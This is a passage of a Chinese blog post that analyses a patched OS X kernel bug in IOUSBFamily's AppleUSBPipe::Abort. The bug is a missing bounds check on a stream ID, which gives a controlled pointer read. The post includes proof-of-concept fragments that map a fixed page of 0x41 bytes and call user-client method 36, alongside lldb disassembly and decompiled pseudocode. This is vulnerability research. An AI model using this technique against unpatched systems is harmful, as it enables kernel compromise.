<p>结合<code>frame #3</code>的信息，以及poc中的相关代码段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">  err = IOConnectCallMethod(</span><br><span class="line">   conn,</span><br><span class="line">   <span class="number">36</span>,</span><br><span class="line">   inputScalar,</span><br><span class="line">   inputScalarCnt,</span><br><span class="line">   inputStruct,</span><br><span class="line">   inputStructCnt,</span><br><span class="line">   outputScalar,</span><br><span class="line">   &amp;outputScalarCnt,</span><br><span class="line">   outputStruct,</span><br><span class="line">   &amp;outputStructCnt); </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>是在应用层程序调用IOUSBFamily的36号方法，<code>_AbortStreamsPipe</code>时触发的漏洞。</li>
<li><code>_AbortStreamsPipe</code>又调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数。</li>
<li><code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数最后调用了<code>AppleUSBPipe::Abort</code>并触发了函数的崩溃。</li>
</ul>
<h2 id="2-2_崩溃原因">2.2 崩溃原因</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  	<span class="number">0</span>xffffff7f91b1155f &lt;+<span class="number">119</span>&gt;: callq  <span class="number">0</span>xffffff80112ecc50        ; kprintf at pe_kprintf.c:<span class="number">105</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11564 &lt;+<span class="number">124</span>&gt;: testl  %r14d, %r14d</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11567 &lt;+<span class="number">127</span>&gt;: je     <span class="number">0</span>xffffff7f91b115a8        ; &lt;+<span class="number">192</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11569 &lt;+<span class="number">129</span>&gt;: movl   %r14d, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1156c &lt;+<span class="number">132</span>&gt;: movq   <span class="number">0</span>x88(%rbx), %rcx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11573 &lt;+<span class="number">139</span>&gt;: movq   (%rcx,%rax,<span class="number">8</span>), %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11577 &lt;+<span class="number">143</span>&gt;: movl   <span class="variable">$0xe00002f0</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157c &lt;+<span class="number">148</span>&gt;: testq  %rdi, %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157f &lt;+<span class="number">151</span>&gt;: je     <span class="number">0</span>xffffff7f91b115c9        ; &lt;+<span class="number">225</span>&gt; at AppleUSBPipe.cpp:<span class="number">1187</span></span><br><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11584 &lt;+<span class="number">156</span>&gt;: xorl   %esi, %esi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11586 &lt;+<span class="number">158</span>&gt;: movl   <span class="variable">$0xe00002eb</span>, %edx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158b &lt;+<span class="number">163</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158d &lt;+<span class="number">165</span>&gt;: callq  *<span class="number">0</span>x178(%rax)</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11593 &lt;+<span class="number">171</span>&gt;: cmpl   <span class="variable">$0xe00002d6</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11598 &lt;+<span class="number">176</span>&gt;: je     <span class="number">0</span>xffffff7f91b115b6        ; &lt;+<span class="number">206</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159a &lt;+<span class="number">178</span>&gt;: cmpl   <span class="variable">$0xe0005001</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159f &lt;+<span class="number">183</span>&gt;: jne    <span class="number">0</span>xffffff7f91b115bd        ; &lt;+<span class="number">213</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b115a1 &lt;+<span class="number">185</span>&gt;: movl   <span class="variable">$0xe000405d</span>, %eax</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure>
<p>崩溃的指令是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br></pre></td></tr></table></figure>
<p>对AT&amp;T格式汇编不熟悉的可以看第二行的汇编代码，他们是一样的。<br><code>$rdi</code>的值为<code>0x4141414141414141</code>,而该指令试图读取地址为<code>0x4141414141414141</code>出的值并复制给<code>$rax</code>，所以就崩溃了。</p>
<h1 id="0x03_IOUSBFamily代码分析">0x03 IOUSBFamily代码分析</h1><p>通过结合动态分析与静态分析，给出分析后的伪代码。分析过程略过,都是体力活。</p>
<h2 id="3-1_IOUSBInterfaceUserClient::_AbortStreamsPipe">3.1 IOUSBInterfaceUserClient::_AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall IOUSBInterfaceUserClient::_AbortStreamsPipe(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 _a3; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er15@2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er12@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v7; <span class="comment">// r13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl@5</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+10h] [bp-40h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  _a3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">436</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    clock_get_system_microtime(&amp;v13, &amp;v12);</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">436</span>);</span><br><span class="line">    v11 = v13;</span><br><span class="line">    v5 = v12;</span><br><span class="line">    LODWORD(v6) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">904L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + <span class="number">952L</span>L))(a1, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &amp; <span class="number">0x10000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a2 = v11;</span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v11, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5, v7, v8, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (*(<span class="keyword">int</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + <span class="number">2488L</span>L))(a1, a2);</span><br><span class="line">  result = -<span class="number">536870174</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// this-&gt;AbortStreamsPipe(this,0x00000000,0xf0f0f0f0)</span></span><br><span class="line">    result = (*(<span class="keyword">int</span> (__fastcall **)(__int64, _QWORD, _QWORD))(*(_QWORD *)a1</span><br><span class="line">                                                            + <span class="number">0xB58</span>LL))(<span class="comment">// call abortstreamspipe </span></span><br><span class="line">                                                <span class="comment">// get function from this+0xb58</span></span><br><span class="line">               a1,                              <span class="comment">// this</span></span><br><span class="line">               **(_BYTE **)(_a3 + <span class="number">0x20</span>),        <span class="comment">// (lldb) x $rcx</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab0: 00 00 00 00 00 00 00 00 f0 f0 f0 f0 00 00 00 00  ........????....</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">               *(_DWORD *)(*(_QWORD *)(_a3 + <span class="number">0x20</span>) + <span class="number">8L</span>L));<span class="comment">// (lldb) x $rcx+0x8</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ab8: f0 f0 f0 f0 00 00 00 00 00 00 00 00 00 00 00 00  ????............</span></span><br><span class="line">                                                <span class="comment">// 0xffffff800a444ac8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑非常简单，就是根据收到的参数处理后调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数，每一个参数已经在注释中体现了。</p>
<h2 id="3-2IOUSBInterfaceUserClient::AbortStreamsPipe">3.2IOUSBInterfaceUserClient::AbortStreamsPipe</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall IOUSBInterfaceUserClient::AbortStreamsPipe(IOUSBInterfaceUserClient *<span class="keyword">this</span>, <span class="keyword">unsigned</span> __int8 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> steamID; <span class="comment">// er15@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 _a2; <span class="comment">// r12@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er15@2</span></span><br><span class="line">  __int64 v6; <span class="comment">// r12@2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er13@2</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14@2</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// er14@6</span></span><br><span class="line">  OSMetaClassBase *_p_pipe_obj; <span class="comment">// rax@8</span></span><br><span class="line">  <span class="keyword">const</span> OSMetaClass *v13; <span class="comment">// rdx@8</span></span><br><span class="line">  OSMetaClassBase *__p_pipe_obj; <span class="comment">// rbx@8</span></span><br><span class="line">  _QWORD *_p_usb_pipe; <span class="comment">// rax@9</span></span><br><span class="line">  <span class="keyword">int</span> _ret; <span class="comment">// eax@10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [sp+18h] [bp-38h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [sp+1Ch] [bp-34h]@2</span></span><br><span class="line">  __int64 v20; <span class="comment">// [sp+20h] [bp-30h]@2</span></span><br><span class="line"></span><br><span class="line">  steamID = a3;                                 <span class="comment">// 0xf0f0f0f0</span></span><br><span class="line">  _a2 = a2;                                     <span class="comment">// 0x00000000</span></span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)<span class="keyword">this</span> + <span class="number">0x1B4</span>) &amp; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = a3;</span><br><span class="line">    clock_get_system_microtime(&amp;v20, &amp;v19);</span><br><span class="line">    v5 = *((_DWORD *)<span class="keyword">this</span> + <span class="number">0x6D</span>);</span><br><span class="line">    v6 = v20;</span><br><span class="line">    v7 = v19;</span><br><span class="line">    LODWORD(v8) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x388</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    LODWORD(v10) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0x3B8</span>LL))(<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">0x10000</span> )</span><br><span class="line">      kprintf(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      IOLog(&amp;<span class="string">"%06lu.%06u %s@%s: %s::%s: \n"</span>, v6, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v7, v9, v10, <span class="string">"IOUSBInterfaceUserClient"</span>);</span><br><span class="line">    steamID = v18;</span><br><span class="line">    _a2 = a2;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = <span class="number">0xE00002D9</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">0x37</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)IOService::isInactive(<span class="keyword">this</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(_p_pipe_obj) = (*(<span class="keyword">int</span> (__fastcall **)(IOUSBInterfaceUserClient *, _QWORD))(*(_QWORD *)<span class="keyword">this</span> + <span class="number">0xA68</span>LL))(</span><br><span class="line">                               <span class="keyword">this</span>,</span><br><span class="line">                               _a2);            <span class="comment">// IOUSBInterfaceUserClient::GetPipeObj</span></span><br><span class="line">      __p_pipe_obj = _p_pipe_obj;</span><br><span class="line">      ret = <span class="number">0xE0004061</span>;</span><br><span class="line">      <span class="keyword">if</span> ( _p_pipe_obj )</span><br><span class="line">      &#123;</span><br><span class="line">        _p_usb_pipe = (_QWORD *)OSMetaClassBase::safeMetaCast(</span><br><span class="line">                                  _p_pipe_obj,</span><br><span class="line">                                  (<span class="keyword">const</span> OSMetaClassBase *)IOUSBPipeV2::metaClass,</span><br><span class="line">                                  v13);</span><br><span class="line">        <span class="keyword">if</span> ( _p_usb_pipe )</span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(_QWORD *, _QWORD))(*_p_usb_pipe + <span class="number">0x278</span>LL))(_p_usb_pipe, steamID);<span class="comment">// AppleUSBPipe::Abort(UInt32 streamID)</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _ret = (*(<span class="keyword">int</span> (__fastcall **)(OSMetaClassBase *, _QWORD))(*(_QWORD *)__p_pipe_obj + <span class="number">0x128</span>LL))(</span><br><span class="line">                   __p_pipe_obj,</span><br><span class="line">                   IOUSBPipeV2::metaClass);</span><br><span class="line">        ret = _ret;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(OSMetaClassBase *))(*(_QWORD *)__p_pipe_obj + <span class="number">0x28</span>LL))(__p_pipe_obj);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用<code>AppleUSBPipe::Abort</code></p>
<h2 id="3-3_AppleUSBPipe::Abort">3.3 AppleUSBPipe::Abort</h2><p>这个函数看汇编代码更容易理解一些<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">0</span>x000000000002c569         mov        eax, r14d</span><br><span class="line"><span class="number">0</span>x000000000002c56c         mov        rcx, qword [ds:rbx+<span class="number">0</span>x88]</span><br><span class="line"><span class="number">0</span>x000000000002c573         mov        rdi, qword [ds:rcx+rax*<span class="number">8</span>]</span><br><span class="line"><span class="number">0</span>x000000000002c577         mov        eax, <span class="number">0</span>xe00002f0</span><br><span class="line"><span class="number">0</span>x000000000002c57c         <span class="built_in">test</span>       rdi, rdi</span><br><span class="line"><span class="number">0</span>x000000000002c57f         je         <span class="number">0</span>x2c5c9</span><br><span class="line"></span><br><span class="line">-&gt;<span class="number">0</span>x000000000002c581         mov        rax, qword [ds:rdi]</span><br><span class="line"><span class="number">0</span>x000000000002c584         xor        esi, esi</span><br><span class="line"><span class="number">0</span>x000000000002c586         mov        edx, <span class="number">0</span>xe00002eb</span><br><span class="line"><span class="number">0</span>x000000000002c58b         xor        ecx, ecx</span><br><span class="line"><span class="number">0</span>x000000000002c58d         call       qword [ds:rax+<span class="number">0</span>x178]</span><br><span class="line"><span class="number">0</span>x000000000002c593         cmp        eax, <span class="number">0</span>xe00002d6</span><br><span class="line"><span class="number">0</span>x000000000002c598         je         <span class="number">0</span>x2c5b6</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>各个寄存器的值如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) register <span class="built_in">read</span></span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0</span>x00000000e00002f0</span><br><span class="line">       rbx = <span class="number">0</span>xffffff801c1a6100</span><br><span class="line">       rcx = <span class="number">0</span>x0000000000000000</span><br><span class="line">       rdx = <span class="number">0</span>xffffff801779f6e0</span><br><span class="line">       rdi = <span class="number">0</span>x4141414141414141</span><br><span class="line">       rsi = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rbp = <span class="number">0</span>xffffff887b613b20</span><br><span class="line">       rsp = <span class="number">0</span>xffffff887b613ae0</span><br><span class="line">        r8 = <span class="number">0</span>x0000000000000000</span><br><span class="line">        r9 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r10 = <span class="number">0</span>xffffff7f91b408a1  <span class="string">""</span></span><br><span class="line">       r11 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r12 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r13 = <span class="number">0</span>x0000000000000000</span><br><span class="line">       r14 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       r15 = <span class="number">0</span>x00000000f0f0f0f0</span><br><span class="line">       rip = <span class="number">0</span>xffffff7f91b11581  IOUSBFamily`AppleUSBPipe::Abort(unsigned int) + <span class="number">153</span> at AppleUSBPipe.cpp:<span class="number">1181</span></span><br><span class="line">    rflags = <span class="number">0</span>x0000000000010206</span><br><span class="line">        cs = <span class="number">0</span>x0000000000000008</span><br><span class="line">        fs = <span class="number">0</span>x0000000000000000</span><br><span class="line">        gs = <span class="number">0</span>x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>当执行到这里时，因为rax是应用层传入的参数<code>0xf0f0f0f0</code>,而rcx的值是<code>0x0000000000000000</code>,所以根据rax的不同，rdi的值会是一个从<code>0x0000000000000000</code>地址开始偏移量是IOUSBInterfaceUserClient::AbortStreamsPipe函数中的SteamID，也就是POC中的<code>0xf0f0f0f0</code>乘以<code>8LL</code>之后获得的所得地址所指向的内存处的值。</p>
<p>因为<code>0xf0f0f0f0</code>是一个POC中可控值，所以<code>0x000000000002c573         mov        rdi, qword [ds:rcx+rax*8]</code>是一个从0x0000000000000000地址开始任意偏移量的任意读取。<br>因为0xf0f0f0f0*0x8=0x787878780,结合POC中代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">map_payload</span><span class="params">(uint64_t target_rip)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span>*** obj_ptr_ptr = (<span class="keyword">void</span>*)<span class="number">0x0000000787878780</span>;</span><br><span class="line">  <span class="keyword">void</span>* request           = (<span class="keyword">void</span>*)<span class="number">0x0000000787878000</span>;</span><br><span class="line">  <span class="keyword">void</span>* page = mmap(request, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request != page) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MAP_FIXED didn't give us the right page\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>((<span class="keyword">void</span>*)page, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从地址0x0000000787878000开始一直到0x0000000787878000+0x1000处所有的值都为0x41。<br>所以rdi寄存器的值为0x4141414141414141，从而导致了POC执行时出现崩溃。</p>
<p>至此POC分析完毕。</p>
<h1 id="3-4_小结">3.4 小结</h1><p>调试poc花了一些时间，陷入了各种代码实现的分析，和做开发时一样，调bug时需要注重崩溃的现场，分析的过程中经常埋头分析了一大通之后发现得到的信息在崩溃现场已经有了，甚至还有一些分析过程中想不通的问题，在崩溃的现场也已经有线索了。</p>
<h1 id="reference">reference</h1><p>1.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">OS X Kernel code execution due to lack of bounds checking in AppleUSBPipe::Abort</a></p>
<h1 id="PS">PS</h1><p>这是我的学习分享博客<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id">最初的漏洞报告</a></li>
